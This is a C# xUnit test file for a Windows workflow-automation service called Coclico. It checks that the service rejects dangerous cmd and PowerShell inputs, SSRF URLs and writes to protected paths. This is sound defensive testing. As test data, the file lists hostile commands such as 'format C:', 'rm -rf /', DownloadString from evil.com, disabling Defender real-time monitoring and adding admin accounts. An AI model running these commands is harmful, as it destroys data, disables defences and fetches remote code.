#nullable enable
using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Coclico.Models;
using Coclico.Services;
using Xunit;

namespace Coclico.Tests
{
    internal static class ChainBuilder
    {
        internal static WorkflowPipeline Build(string name, params PipelineStep[] items)
        {
            var chain = new WorkflowPipeline { Name = name };
            foreach (var item in items)
                chain.Items.Add(item);
            return chain;
        }

        internal static WorkflowPipeline SingleNode(PipelineStep inner)
        {
            inner.IsEnabled = true;
            return Build("Test",
                new PipelineStep { NodeType = NodeType.Start, Name = "S", IsEnabled = true },
                inner,
                new PipelineStep { NodeType = NodeType.End, Name = "E", IsEnabled = true });
        }

        internal static WorkflowPipeline CommandChain(string cmd) => SingleNode(
            new PipelineStep { NodeType = NodeType.RunCommand, Name = "cmd", CommandLine = cmd });

        internal static WorkflowPipeline PsChain(string script) => SingleNode(
            new PipelineStep { NodeType = NodeType.RunPowerShell, Name = "ps", PowerShellScript = script });

        internal static WorkflowPipeline HttpChain(string url) => SingleNode(
            new PipelineStep { NodeType = NodeType.HttpRequest, Name = "req", HttpUrl = url, HttpMethod = "GET" });

        internal static WorkflowPipeline FileChain(string src, string dst, string op = "copy") => SingleNode(
            new PipelineStep
            {
                NodeType = NodeType.FileOperation,
                Name = "f",
                FileOperationSource = src,
                FileOperationDest = dst,
                FileOperationType = op
            });

        internal static WorkflowPipeline DeleteChain(string path) => SingleNode(
            new PipelineStep
            {
                NodeType = NodeType.FileOperation,
                Name = "del",
                FileOperationSource = path,
                FileOperationType = "delete"
            });

        internal static WorkflowPipeline CondChain(ConditionOperator op, string value) => SingleNode(
            new PipelineStep
            {
                NodeType = NodeType.Condition,
                Name = "cond",
                ConditionOperator = op,
                ConditionValue = value
            });
    }

    public class BlockedCommandSecurityTests
    {
        [Theory]
        [InlineData("format C:")]
        [InlineData("FORMAT D:")]
        [InlineData("rd /s /q C:\\Users")]
        [InlineData("rmdir /s /q C:\\Windows")]
        [InlineData("del /f /s /q C:\\")]
        [InlineData("del /s /q C:\\temp")]
        [InlineData("rm -rf /")]
        [InlineData("rm -r /home")]
        [InlineData("bcdedit /deletevalue")]
        [InlineData("diskpart")]
        [InlineData("reg delete HKLM\\SOFTWARE")]
        [InlineData("net user admin password")]
        [InlineData("net localgroup administrators user /add")]
        [InlineData("sc delete MyService")]
        [InlineData("sc stop MyService")]
        [InlineData("cipher /w:C:\\")]
        [InlineData("icacls C:\\ /grant Everyone:F")]
        [InlineData("takeown /f C:\\Windows")]
        public async Task BlockedCommand_NodeFails(string dangerousCmd)
        {
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(ChainBuilder.CommandChain(dangerousCmd));
            Assert.True(result.NodesFailed > 0, $"Should block: {dangerousCmd}");
        }

        [Theory]
        [InlineData("FORMAT C:")]
        [InlineData("Format C:")]
        [InlineData("BCDEDIT")]
        [InlineData("Bcdedit")]
        public async Task BlockedCommand_CaseInsensitive_IsBlocked(string cmd)
        {
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(ChainBuilder.CommandChain(cmd));
            Assert.True(result.NodesFailed > 0);
        }

        [Fact]
        public async Task BlockedCommand_ExtraWhitespace_StillBlocked()
        {
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(ChainBuilder.CommandChain("format   C:"));
            Assert.True(result.NodesFailed > 0);
        }

        [Theory]
        [InlineData("echo hello")]
        [InlineData("dir C:\\")]
        [InlineData("ipconfig")]
        public async Task SafeCommand_IsNotBlocked(string safeCmd)
        {
            var svc = new WorkflowService();
            var item = new PipelineStep
            {
                NodeType = NodeType.RunCommand,
                Name = "cmd",
                CommandLine = safeCmd,
                WaitForPreviousExit = true
            };
            var result = await svc.ExecuteChainAsync(ChainBuilder.SingleNode(item));

            Assert.NotNull(result);
        }
    }

    public class BlockedPowerShellSecurityTests
    {
        [Theory]
        [InlineData("Format-Volume -DriveLetter C")]
        [InlineData("Remove-Item -Recurse C:\\Users")]
        [InlineData("Invoke-Expression 'malicious code'")]
        [InlineData("IEX 'evil'")]
        [InlineData("iex('bad')")]
        [InlineData("-EncodedCommand AAAA")]
        [InlineData("[Convert]::FromBase64String('abc')")]
        [InlineData("::FromBase64String('data')")]
        [InlineData("DownloadString('https://evil.com')")]
        [InlineData("DownloadFile('https://evil.com', 'out.exe')")]
        [InlineData("Invoke-WebRequest https://evil.com")]
        [InlineData("iwr https://evil.com")]
        [InlineData("New-Object Net.WebClient")]
        [InlineData("[Net.WebClient]::new()")]
        [InlineData("[System.Reflection.Assembly]::Load('evil')")]
        [InlineData("[Reflection.Assembly]::Load('evil')")]
        [InlineData("Assembly::LoadFrom('evil.dll')")]
        [InlineData("Set-MpPreference -DisableRealtimeMonitoring $true")]
        [InlineData("Add-MpPreference -ExclusionPath C:\\")]
        [InlineData("net user admin /add")]
        [InlineData("net localgroup administrators user /add")]
        [InlineData("New-LocalUser -Name hacker")]
        [InlineData("Add-LocalGroup -Name admin")]
        [InlineData("Remove-ItemProperty HKLM:\\SOFTWARE\\key")]
        public async Task BlockedPsScript_IsRejected(string script)
        {
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(ChainBuilder.PsChain(script));
            Assert.True(result.NodesFailed > 0, $"Should block PS: {script[..Math.Min(60, script.Length)]}");
        }

        [Fact]
        public async Task EmptyPsScript_ReturnsFalse()
        {
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(ChainBuilder.PsChain(""));
            Assert.True(result.NodesFailed > 0);
        }

        [Fact]
        public async Task WhitespacePsScript_ReturnsFalse()
        {
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(ChainBuilder.PsChain("   \t\n  "));
            Assert.True(result.NodesFailed > 0);
        }

        [Fact]
        public async Task SafePsScript_WriteOutput_NotBlocked()
        {
            var svc = new WorkflowService();
            var item = new PipelineStep
            {
                NodeType = NodeType.RunPowerShell,
                Name = "ps",
                PowerShellScript = "Write-Output 'hello'",
                WaitForPreviousExit = true
            };
            var result = await svc.ExecuteChainAsync(ChainBuilder.SingleNode(item));
            Assert.NotNull(result);
        }
    }

    public class SsrfProtectionTests
    {
        [Theory]
        [InlineData("https://localhost/api")]
        [InlineData("https://127.0.0.1/admin")]
        [InlineData("https://127.0.0.255/secret")]
        [InlineData("https://10.0.0.1/internal")]
        [InlineData("https://10.255.255.255/data")]
        [InlineData("https://172.16.0.1/priv")]
        [InlineData("https://172.31.255.255/priv")]
        [InlineData("https://192.168.1.1/router")]
        [InlineData("https://169.254.169.254/metadata")]
        [InlineData("https://::1/ipv6loopback")]
        public async Task PrivateOrLoopbackUrl_IsBlocked(string url)
        {
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(ChainBuilder.HttpChain(url));
            Assert.True(result.NodesFailed > 0, $"SSRF should block: {url}");
        }

        [Fact]
        public async Task HttpRequest_EmptyUrl_ReturnsFalse()
        {
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(ChainBuilder.HttpChain(""));
            Assert.True(result.NodesFailed > 0);
        }

        [Fact]
        public async Task HttpRequest_InvalidUrl_ReturnsFalse()
        {
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(ChainBuilder.HttpChain("not-a-url"));
            Assert.True(result.NodesFailed > 0);
        }

        [Fact]
        public async Task HttpRequest_FtpScheme_IsBlocked()
        {
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(ChainBuilder.HttpChain("ftp://example.com/file"));
            Assert.True(result.NodesFailed > 0);
        }
    }

    public class ProtectedPathSecurityTests
    {
        [Theory]
        [InlineData(@"C:\Windows\System32\cmd.exe")]
        [InlineData(@"C:\Windows\notepad.exe")]
        [InlineData(@"C:\Program Files\SomeApp\app.exe")]
        [InlineData(@"C:\Program Files (x86)\SomeApp\app.exe")]
        [InlineData(@"C:\ProgramData\Microsoft\Windows\Start Menu\startup.lnk")]
        [InlineData(@"C:\System Volume Information\tracking.log")]
        [InlineData(@"C:\Recovery\winre.wim")]
        [InlineData(@"C:\Boot\BCD")]
        [InlineData(@"C:\EFI\Microsoft\boot")]
        public async Task CopyFrom_ProtectedSource_IsBlocked(string src)
        {
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(
                ChainBuilder.FileChain(src, Path.GetTempPath() + "\\output.tmp"));
            Assert.True(result.NodesFailed > 0, $"Protected source should block: {src}");
        }

        [Theory]
        [InlineData(@"C:\Windows\System32\evil.dll")]
        [InlineData(@"C:\Program Files\SomeApp\hijack.exe")]
        public async Task CopyTo_ProtectedDest_IsBlocked(string dst)
        {
            var src = Path.GetTempFileName();
            try
            {
                var svc = new WorkflowService();
                var result = await svc.ExecuteChainAsync(ChainBuilder.FileChain(src, dst));
                Assert.True(result.NodesFailed > 0, $"Protected dest should block: {dst}");
            }
            finally { try { File.Delete(src); } catch { } }
        }

        [Fact]
        public async Task Delete_ProtectedPath_IsBlocked()
        {
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(
                ChainBuilder.DeleteChain(@"C:\Windows\System32\cmd.exe"));
            Assert.True(result.NodesFailed > 0);
        }

        [Fact]
        public async Task FileOp_EmptySource_ReturnsFalse()
        {
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(
                ChainBuilder.FileChain("", Path.GetTempPath() + "\\out.tmp"));
            Assert.True(result.NodesFailed > 0);
        }

        [Fact]
        public async Task CopyFile_SafePaths_Succeeds()
        {
            var src = Path.GetTempFileName();
            var dst = Path.Combine(Path.GetTempPath(), "coclico_copy_" + Guid.NewGuid().ToString("N") + ".tmp");
            try
            {
                File.WriteAllText(src, "test");
                var svc = new WorkflowService();
                var result = await svc.ExecuteChainAsync(ChainBuilder.FileChain(src, dst));
                Assert.Equal(0, result.NodesFailed);
                Assert.True(File.Exists(dst));
            }
            finally
            {
                try { File.Delete(src); } catch { }
                try { File.Delete(dst); } catch { }
            }
        }

        [Fact]
        public async Task MoveFile_SafePaths_Succeeds()
        {
            var src = Path.GetTempFileName();
            var dst = Path.Combine(Path.GetTempPath(), "coclico_move_" + Guid.NewGuid().ToString("N") + ".tmp");
            try
            {
                File.WriteAllText(src, "move me");
                var svc = new WorkflowService();
                var result = await svc.ExecuteChainAsync(ChainBuilder.FileChain(src, dst, "move"));
                Assert.Equal(0, result.NodesFailed);
                Assert.True(File.Exists(dst));
                Assert.False(File.Exists(src));
            }
            finally { try { File.Delete(dst); } catch { } }
        }

        [Fact]
        public async Task DeleteFile_SafePath_Succeeds()
        {
            var file = Path.GetTempFileName();
            File.WriteAllText(file, "delete me");
            var svc = new WorkflowService();
            var result = await svc.ExecuteChainAsync(ChainBuilder.DeleteChain(file));
            Assert.Equal(0, result.NodesFailed);
            Assert.False(File.Exists(file));
        }
    }

    public class ConditionEvaluationTests
    {
        [Fact]
        public async Task FileExists_RealFile_Succeeds()
        {
            var tmp = Path.GetTempFileName();
            try
            {
                var result = await new WorkflowService()
                    .ExecuteChainAsync(ChainBuilder.CondChain(ConditionOperator.FileExists, tmp));
                Assert.Equal(0, result.NodesFailed);
            }
            finally { try { File.Delete(tmp); } catch { } }
        }

        [Fact]
        public async Task FileExists_MissingFile_Fails()
        {
            var result = await new WorkflowService()
                .ExecuteChainAsync(ChainBuilder.CondChain(
                    ConditionOperator.FileExists, @"C:\nonexistent_coclico_test_xyz.tmp"));
            Assert.True(result.NodesFailed > 0);
        }

        [Fact]
        public async Task FileNotExists_MissingFile_Succeeds()
        {
            var result = await new WorkflowService()
                .ExecuteChainAsync(ChainBuilder.CondChain(
                    ConditionOperator.FileNotExists, @"C:\nonexistent_coclico_test_xyz.tmp"));
            Assert.Equal(0, result.NodesFailed);
        }

        [Fact]
        public async Task FileNotExists_ExistingFile_Fails()
        {
            var tmp = Path.GetTempFileName();
            try
            {
                var result = await new WorkflowService()
                    .ExecuteChainAsync(ChainBuilder.CondChain(ConditionOperator.FileNotExists, tmp));
                Assert.True(result.NodesFailed > 0);
            }
            finally { try { File.Delete(tmp); } catch { } }
        }

        [Fact]
        public async Task ProcessNotRunning_FakeProcess_Succeeds()
        {
            var result = await new WorkflowService()
                .ExecuteChainAsync(ChainBuilder.CondChain(
                    ConditionOperator.ProcessNotRunning, "this_proc_not_running_coclico_test_xyz"));
            Assert.Equal(0, result.NodesFailed);
        }

        [Fact]
        public async Task ProcessRunning_CurrentProcess_Succeeds()
        {
            var proc = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
            var result = await new WorkflowService()
                .ExecuteChainAsync(ChainBuilder.CondChain(ConditionOperator.ProcessRunning, proc));
            Assert.Equal(0, result.NodesFailed);
        }

        [Fact]
        public async Task ProcessRunning_EmptyValue_Fails()
        {
            var result = await new WorkflowService()
                .ExecuteChainAsync(ChainBuilder.CondChain(ConditionOperator.ProcessRunning, ""));
            Assert.True(result.NodesFailed > 0);
        }

        [Fact]
        public async Task ProcessNotRunning_EmptyValue_Fails()
        {
            var result = await new WorkflowService()
                .ExecuteChainAsync(ChainBuilder.CondChain(ConditionOperator.ProcessNotRunning, ""));
            Assert.True(result.NodesFailed > 0);
        }

        [Fact]
        public async Task TimeAfter_Midnight_AlwaysSucceeds()
        {
            var result = await new WorkflowService()
                .ExecuteChainAsync(ChainBuilder.CondChain(ConditionOperator.TimeAfter, "00:00:00"));
            Assert.Equal(0, result.NodesFailed);
        }

        [Fact]
        public async Task TimeBefore_EndOfDay_AlwaysSucceeds()
        {
            var result = await new WorkflowService()
                .ExecuteChainAsync(ChainBuilder.CondChain(ConditionOperator.TimeBefore, "23:59:59"));
            Assert.Equal(0, result.NodesFailed);
        }

        [Fact]
        public async Task Condition_InvalidTimeValue_DoesNotThrow()
        {
            var ex = await Record.ExceptionAsync(() =>
                new WorkflowService()
                    .ExecuteChainAsync(ChainBuilder.CondChain(ConditionOperator.TimeAfter, "not-a-time")));
            Assert.Null(ex);
        }
    }

    public class NodeTypeExecutionTests
    {
        private static Task<WorkflowService.ExecutionResult> Run(PipelineStep item)
            => new WorkflowService().ExecuteChainAsync(ChainBuilder.SingleNode(item));

        [Fact]
        public async Task DelayNode_ZeroDelay_Succeeds()
        {
            var r = await Run(new PipelineStep { NodeType = NodeType.Delay, Name = "d", DelaySeconds = 0 });
            Assert.Equal(0, r.NodesFailed);
        }

        [Fact]
        public async Task LoopNode_ZeroIterations_Succeeds()
        {
            var r = await Run(new PipelineStep { NodeType = NodeType.Loop, Name = "l", LoopCount = 0 });
            Assert.Equal(0, r.NodesFailed);
        }

        [Fact]
        public async Task LoopNode_OneIteration_NoDelay_Succeeds()
        {
            var r = await Run(new PipelineStep { NodeType = NodeType.Loop, Name = "l", LoopCount = 1, LoopDelayMs = 0 });
            Assert.Equal(0, r.NodesFailed);
        }

        [Fact]
        public async Task LoopNode_Cancellation_HandledGracefully()
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromMilliseconds(200));
            var ex = await Record.ExceptionAsync(() =>
                new WorkflowService().ExecuteChainAsync(
                    ChainBuilder.SingleNode(new PipelineStep { NodeType = NodeType.Loop, Name = "l", LoopCount = 10000, LoopDelayMs = 100 }),
                    ct: cts.Token));
            Assert.Null(ex);
        }

        [Fact]
        public async Task EmptyRecycleBin_DoesNotThrow()
        {
            var ex = await Record.ExceptionAsync(() =>
                Run(new PipelineStep { NodeType = NodeType.EmptyRecycleBin, Name = "rb" }));
            Assert.Null(ex);
        }

        [Fact]
        public async Task RamClean_DoesNotThrow()
        {
            var ex = await Record.ExceptionAsync(() =>
                Run(new PipelineStep { NodeType = NodeType.RamClean, Name = "ram" }));
            Assert.Null(ex);
        }

        [Fact]
        public async Task CleanTemp_DoesNotThrow()
        {
            var ex = await Record.ExceptionAsync(() =>
                Run(new PipelineStep { NodeType = NodeType.CleanTemp, Name = "tmp" }));
            Assert.Null(ex);
        }

        [Fact]
        public async Task KillByMemory_DoesNotThrow()
        {
            var ex = await Record.ExceptionAsync(() =>
                Run(new PipelineStep { NodeType = NodeType.KillByMemory, Name = "kmem" }));
            Assert.Null(ex);
        }

        [Fact]
        public async Task MuteAudio_DoesNotThrow()
        {
            var ex = await Record.ExceptionAsync(() =>
                Run(new PipelineStep { NodeType = NodeType.MuteAudio, Name = "mute" }));
            Assert.Null(ex);
        }

        [Fact]
        public async Task SetVolume_ValidLevel_DoesNotThrow()
        {
            var ex = await Record.ExceptionAsync(() =>
                Run(new PipelineStep { NodeType = NodeType.SetVolume, Name = "vol", VolumeLevel = 50 }));
            Assert.Null(ex);
        }

        [Fact]
        public async Task OpenApp_EmptyPath_Fails()
        {
            var r = await Run(new PipelineStep { NodeType = NodeType.OpenApp, Name = "app", ProgramPath = "" });
            Assert.True(r.NodesFailed > 0);
        }

        [Fact]
        public async Task OpenApp_NonExistentPath_Fails()
        {
            var r = await Run(new PipelineStep { NodeType = NodeType.OpenApp, Name = "app", ProgramPath = @"C:\nonexistent_coclico_test.exe" });
            Assert.True(r.NodesFailed > 0);
        }

        [Fact]
        public async Task CloseApp_EmptyName_Fails()
        {
            var r = await Run(new PipelineStep { NodeType = NodeType.CloseApp, Name = "close", ProcessName = "" });
            Assert.True(r.NodesFailed > 0);
        }

        [Fact]
        public async Task KillProcess_NonExistentProcess_ReturnsFalse()
        {
            var r = await Run(new PipelineStep { NodeType = NodeType.KillProcess, Name = "kill", ProcessName = "this_proc_not_running_xyz_999" });
            Assert.True(r.NodesFailed > 0);
        }

        [Fact]
        public async Task CompressFile_NonExistentSource_Fails()
        {
            var r = await Run(new PipelineStep
            {
                NodeType = NodeType.CompressFile,
                Name = "zip",
                FileOperationSource = @"C:\nonexistent_coclico_src",
                FileOperationDest = Path.Combine(Path.GetTempPath(), "coclico_test.zip")
            });
            Assert.True(r.NodesFailed > 0);
        }

        [Fact]
        public async Task OpenUrl_EmptyUrl_Fails()
        {
            var r = await Run(new PipelineStep { NodeType = NodeType.OpenUrl, Name = "url", UrlToOpen = "" });
            Assert.True(r.NodesFailed > 0);
        }

        [Fact]
        public async Task OpenUrl_ValidHttpsUrl_DoesNotThrow()
        {
            var ex = await Record.ExceptionAsync(() =>
                Run(new PipelineStep { NodeType = NodeType.OpenUrl, Name = "url", UrlToOpen = "https://example.com" }));
            Assert.Null(ex);
        }

        [Fact]
        public async Task SystemCheck_DoesNotThrow()
        {
            var ex = await Record.ExceptionAsync(() =>
                Run(new PipelineStep { NodeType = NodeType.SystemCheck, Name = "sys" }));
            Assert.Null(ex);
        }

        [Fact]
        public async Task SetProcessPriority_EmptyProcessName_Fails()
        {
            var r = await Run(new PipelineStep { NodeType = NodeType.SetProcessPriority, Name = "prio", ProcessName = "" });
            Assert.True(r.NodesFailed > 0);
        }

        [Fact]
        public async Task ClipboardSet_WithText_DoesNotThrow()
        {
            var ex = await Record.ExceptionAsync(() =>
                Run(new PipelineStep { NodeType = NodeType.ClipboardSet, Name = "clip", ClipboardText = "Coclico test" }));
            Assert.Null(ex);
        }

        [Fact]
        public async Task RetryLogic_WithRetryCount1_WaitsAtLeast900ms()
        {
            var item = new PipelineStep
            {
                NodeType = NodeType.OpenApp,
                Name = "retry",
                ProgramPath = @"C:\nonexistent_coclico.exe",
                RetryCount = 1,
                TimeoutSeconds = 0
            };
            var sw = System.Diagnostics.Stopwatch.StartNew();
            var r = await Run(item);
            sw.Stop();
            Assert.True(sw.ElapsedMilliseconds >= 900, $"Expected retry delay ≥900ms, got {sw.ElapsedMilliseconds}ms");
            Assert.True(r.NodesFailed > 0);
        }

        [Fact]
        public async Task TimeoutNode_CancelsAfterTimeout()
        {
            var item = new PipelineStep
            {
                NodeType = NodeType.Delay,
                Name = "slow",
                DelaySeconds = 60,
                TimeoutSeconds = 1
            };
            var sw = System.Diagnostics.Stopwatch.StartNew();
            await Run(item);
            sw.Stop();
            Assert.True(sw.ElapsedMilliseconds < 5000, $"Should timeout in ~1s, got {sw.ElapsedMilliseconds}ms");
        }

        [Fact]
        public async Task ChainExecution_ElapsedTimeIsPositive()
        {
            var r = await Run(new PipelineStep { NodeType = NodeType.Delay, Name = "d", DelaySeconds = 0 });
            Assert.True(r.ElapsedTime.TotalMilliseconds >= 0);
        }

        [Fact]
        public async Task ChainExecution_SummaryContainsStats()
        {
            var r = await Run(new PipelineStep { NodeType = NodeType.Delay, Name = "d", DelaySeconds = 0 });
            Assert.False(string.IsNullOrEmpty(r.Summary));
        }

        [Fact]
        public async Task MultipleNodes_AllExecute()
        {
            var chain = new WorkflowPipeline { Name = "Multi" };
            chain.Items.Add(new PipelineStep { NodeType = NodeType.Start, Name = "S", IsEnabled = true });
            chain.Items.Add(new PipelineStep { NodeType = NodeType.Delay, Name = "d1", DelaySeconds = 0, IsEnabled = true });
            chain.Items.Add(new PipelineStep { NodeType = NodeType.RamClean, Name = "ram", IsEnabled = true });
            chain.Items.Add(new PipelineStep { NodeType = NodeType.End, Name = "E", IsEnabled = true });

            var r = await new WorkflowService().ExecuteChainAsync(chain);

            Assert.True(r.NodesExecuted >= 2);
        }

        [Fact]
        public async Task DisabledNodes_AreNotExecuted()
        {
            var chain = new WorkflowPipeline { Name = "Disabled" };
            chain.Items.Add(new PipelineStep { NodeType = NodeType.Start, Name = "S", IsEnabled = true });
            chain.Items.Add(new PipelineStep { NodeType = NodeType.Delay, Name = "skip", DelaySeconds = 60, IsEnabled = false });
            chain.Items.Add(new PipelineStep { NodeType = NodeType.End, Name = "E", IsEnabled = true });

            var sw = System.Diagnostics.Stopwatch.StartNew();
            var r = await new WorkflowService().ExecuteChainAsync(chain);
            sw.Stop();

            Assert.True(sw.ElapsedMilliseconds < 1000, "Disabled delay node should be skipped");
            Assert.Equal(0, r.NodesFailed);
        }
    }
}
